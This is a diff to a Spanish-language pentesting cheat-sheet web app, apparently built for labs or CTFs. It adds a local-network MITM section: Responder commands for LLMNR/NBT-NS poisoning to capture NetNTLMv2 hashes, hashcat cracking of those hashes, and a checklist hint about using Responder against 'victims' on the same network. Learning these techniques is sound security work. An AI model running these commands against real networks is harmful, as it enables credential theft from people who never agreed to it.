@@ -382,6 +382,10 @@ const D = [
   ["other","Enumerar SNMP con community por defecto","muchos dispositivos dejan 'public' de lectura: vuelca todo el árbol MIB (usuarios, procesos, rutas)","snmpwalk -c public -v1 {IP}"],
   ["other","Comprobar SNMP con NSE","snmp-info confirma la versión y datos del sistema si el 161/UDP responde","nmap -sU -p161 --script snmp-info {IP}"],
 
+  // ===== 9b. Ataques de red / MITM (Responder) =====
+  ["network","Capturar hashes con Responder","envenena LLMNR/NBT-NS/mDNS en la red local; cualquier host que busque un recurso mal escrito te manda su hash NetNTLMv2","sudo responder -I eth0"],
+  ["network","Crackear el hash capturado (NetNTLMv2)","-m 5600 es el modo NetNTLMv2 de hashcat; el hash lo copia Responder a /usr/share/responder/logs","hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt"],
+
   // ===== 10. Búsqueda de exploits =====
   ["vuln","Buscar exploit por servicio y versión","busca en la base local de Exploit-DB coincidencias para lo que encontraste","searchsploit openfire 4.7"],
   ["vuln","Copiar un exploit a la carpeta actual","-m descarga una copia editable del exploit por su número de ID","searchsploit -m 12345"],
@@ -537,6 +541,7 @@ const META = {
   dns:{n:"dns",c:"var(--green)"},
   db:{n:"bases de datos",c:"var(--green)"},
   other:{n:"rdp / ldap / nfs / smtp / snmp",c:"var(--green)"},
+  network:{n:"red local / mitm (responder)",c:"var(--amber)"},
   vuln:{n:"exploits",c:"var(--amber)"},
   webexp:{n:"web ofensiva",c:"var(--amber)"},
   brute:{n:"fuerza bruta",c:"var(--amber)"},
@@ -602,7 +607,7 @@ kipEl.addEventListener("input",render);
 const COPY_ICON=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>`;
 const CHECK_ICON=`<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>`;
 
-const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|reg|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano|nxc|evil-winrm)\b/;
+const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|reg|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk|ifconfig|ipconfig|route|nano|nxc|evil-winrm|responder)\b/;
 
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
 function applyIP(cmd){
@@ -862,6 +867,7 @@ const GUIDES = [
     "¿Revisaste código fuente, comentarios, cabeceras y <code>robots.txt</code>?",
     "¿Probaste las credenciales que tienes en <b>todos</b> los servicios?",
     "¿Buscaste esteganografía en imágenes/ficheros? (<code>steghide</code>, <code>strings</code>, <code>exiftool</code>).",
+    "¿Estás en la misma red que las víctimas? Prueba <code>sudo responder -I eth0</code> y espera a que alguien resuelva un recurso mal escrito.",
   ],"Cuando te atascas, casi siempre es enumeración incompleta. Vuelve atrás y enumera más, no busques exploits raros.",
   [["metodologia","Repasar la metodología"]]],
 ];
